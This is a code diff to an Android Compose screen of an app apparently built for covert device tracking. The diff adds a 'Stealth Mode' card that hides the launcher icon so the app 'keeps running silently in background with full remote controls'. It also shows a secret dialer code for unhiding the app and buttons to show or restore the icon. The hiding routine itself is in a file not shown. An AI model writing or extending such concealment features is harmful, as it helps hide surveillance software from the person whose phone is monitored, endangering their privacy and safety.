@@ -29,6 +29,8 @@ import androidx.compose.material.icons.filled.Security
 import androidx.compose.material.icons.filled.Settings
 import androidx.compose.material.icons.filled.Stop
 import androidx.compose.material.icons.filled.Sync
+import androidx.compose.material.icons.filled.Visibility
+import androidx.compose.material.icons.filled.VisibilityOff
 import androidx.compose.material.icons.filled.Warning
 import androidx.compose.material3.AlertDialog
 import androidx.compose.material3.Button
@@ -39,11 +41,13 @@ import androidx.compose.material3.ElevatedCard
 import androidx.compose.material3.ExperimentalMaterial3Api
 import androidx.compose.material3.Icon
 import androidx.compose.material3.IconButton
-import androidx.compose.material3.MaterialTheme
 import androidx.compose.material3.OutlinedButton
 import androidx.compose.material3.OutlinedTextField
+import androidx.compose.material3.MaterialTheme
 import androidx.compose.material3.Scaffold
 import androidx.compose.material3.Surface
+import androidx.compose.material3.Switch
+import androidx.compose.material3.SwitchDefaults
 import androidx.compose.material3.Text
 import androidx.compose.material3.TextButton
 import androidx.compose.material3.TopAppBar
@@ -64,7 +68,9 @@ import androidx.compose.ui.unit.dp
 import androidx.compose.ui.unit.sp
 import androidx.lifecycle.compose.collectAsStateWithLifecycle
 import androidx.lifecycle.viewmodel.compose.viewModel
+import com.nexus.androkiller.theme.TrackerAppTheme
 import com.nexus.androkiller.tracker.PermissionManager
+import com.nexus.androkiller.util.LauncherVisibility
 
 @OptIn(ExperimentalMaterial3Api::class, ExperimentalLayoutApi::class)
 @Composable
@@ -368,7 +374,7 @@ fun MainScreen(
                 Surface(
                     modifier = Modifier.fillMaxWidth(),
                     shape = RoundedCornerShape(14.dp),
-                    color = MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.5f)
+                    color = MaterialTheme.colorScheme.surfaceContainerHighest
                 ) {
                     Column(modifier = Modifier.padding(14.dp)) {
                         Text("Live Activity Status", fontWeight = FontWeight.SemiBold, fontSize = 12.sp)
@@ -385,6 +391,150 @@ fun MainScreen(
                             fontSize = 11.sp,
                             color = MaterialTheme.colorScheme.onSurfaceVariant
                         )
+                    }
+                }
+            }
+
+            // Stealth Mode Card - Hide/Show Launcher Icon
+            item {
+                var isHidden by remember { mutableStateOf(LauncherVisibility.isLauncherIconHidden(context)) }
+                Card(
+                    modifier = Modifier.fillMaxWidth(),
+                    shape = RoundedCornerShape(16.dp),
+                    colors = CardDefaults.cardColors(containerColor = Color(0xFF1E2830)),
+                    border = androidx.compose.foundation.BorderStroke(
+                        1.dp,
+                        if (isHidden) Color(0xFFFFD600).copy(alpha = 0.5f) else Color(0xFF37474F)
+                    )
+                ) {
+                    Column(modifier = Modifier.padding(16.dp)) {
+                        Row(
+                            modifier = Modifier.fillMaxWidth(),
+                            verticalAlignment = Alignment.CenterVertically,
+                            horizontalArrangement = Arrangement.SpaceBetween
+                        ) {
+                            Column(modifier = Modifier.weight(1f)) {
+                                Row(verticalAlignment = Alignment.CenterVertically) {
+                                    Icon(
+                                        if (isHidden) Icons.Default.VisibilityOff else Icons.Default.Visibility,
+                                        contentDescription = null,
+                                        tint = if (isHidden) Color(0xFFFFD600) else Color(0xFF00E5FF)
+                                    )
+                                    Spacer(modifier = Modifier.width(8.dp))
+                                    Text(
+                                        "Stealth Mode",
+                                        fontWeight = FontWeight.Bold,
+                                        fontSize = 16.sp,
+                                        color = Color.White
+                                    )
+                                    Spacer(modifier = Modifier.width(8.dp))
+                                    Surface(
+                                        shape = RoundedCornerShape(6.dp),
+                                        color = if (isHidden) Color(0xFF3E2723) else Color(0xFF1B5E20)
+                                    ) {
+                                        Text(
+                                            text = if (isHidden) "HIDDEN" else "VISIBLE",
+                                            fontSize = 10.sp,
+                                            fontWeight = FontWeight.Bold,
+                                            color = if (isHidden) Color(0xFFFFD600) else Color(0xFF00E676),
+                                            modifier = Modifier.padding(horizontal = 6.dp, vertical = 2.dp)
+                                        )
+                                    }
+                                }
+                                Spacer(modifier = Modifier.height(4.dp))
+                                Text(
+                                    "Hides app launcher icon completely. App keeps running silently in background with full remote controls.",
+                                    fontSize = 12.sp,
+                                    color = Color(0xFFB0BEC5)
+                                )
+                            }
+                            Spacer(modifier = Modifier.width(8.dp))
+                            Switch(
+                                checked = isHidden,
+                                onCheckedChange = { newValue ->
+                                    val success = if (newValue) {
+                                        LauncherVisibility.hideLauncherIcon(context)
+                                    } else {
+                                        LauncherVisibility.showLauncherIcon(context)
+                                    }
+                                    if (success) {
+                                        isHidden = newValue
+                                    }
+                                },
+                                colors = SwitchDefaults.colors(
+                                    checkedThumbColor = Color(0xFFFFD600),
+                                    checkedTrackColor = Color(0xFF4E342E),
+                                    uncheckedThumbColor = Color(0xFF78909C),
+                                    uncheckedTrackColor = Color(0xFF263238)
+                                )
+                            )
+                        }
+
+                        Spacer(modifier = Modifier.height(10.dp))
+
+                        // Secret dial code fail-safe banner
+                        Surface(
+                            modifier = Modifier.fillMaxWidth(),
+                            shape = RoundedCornerShape(8.dp),
+                            color = Color(0xFF10171D)
+                        ) {
+                            Row(
+                                modifier = Modifier.padding(horizontal = 10.dp, vertical = 8.dp),
+                                verticalAlignment = Alignment.CenterVertically
+                            ) {
+                                Icon(
+                                    Icons.Default.Security,
+                                    contentDescription = null,
+                                    tint = Color(0xFF00E5FF),
+                                    modifier = Modifier.size(16.dp)
+                                )
+                                Spacer(modifier = Modifier.width(8.dp))
+                                Text(
+                                    "Fail-Safe Dial Code: Open Phone app and dial *#*#1337#*#* to unhide icon & launch instantly.",
+                                    fontSize = 11.sp,
+                                    color = Color(0xFF90A4AE),
+                                    lineHeight = 15.sp
+                                )
+                            }
+                        }
+
+                        Spacer(modifier = Modifier.height(10.dp))
+
+                        Row(
+                            modifier = Modifier.fillMaxWidth(),
+                            horizontalArrangement = Arrangement.spacedBy(8.dp)
+                        ) {
+                            OutlinedButton(
+                                onClick = {
+                                    val success = LauncherVisibility.toggleLauncherIcon(context)
+                                    if (success) isHidden = !isHidden
+                                },
+                                modifier = Modifier.weight(1f),
+                                shape = RoundedCornerShape(10.dp)
+                            ) {
+                                Icon(
+                                    if (isHidden) Icons.Default.Visibility else Icons.Default.VisibilityOff,
+                                    contentDescription = null,
+                                    modifier = Modifier.size(16.dp)
+                                )
+                                Spacer(modifier = Modifier.width(4.dp))
+                                Text(
+                                    if (isHidden) "Show Icon" else "Hide Icon",
+                                    fontSize = 12.sp
+                                )
+                            }
+                            OutlinedButton(
+                                onClick = {
+                                    LauncherVisibility.showLauncherIcon(context)
+                                    isHidden = false
+                                },
+                                modifier = Modifier.weight(1f),
+                                shape = RoundedCornerShape(10.dp),
+                                colors = ButtonDefaults.outlinedButtonColors(contentColor = Color(0xFF00E676))
+                            ) {
+                                Text("Force Restore", fontSize = 12.sp)
+                            }
+                        }
                     }
                 }
             }
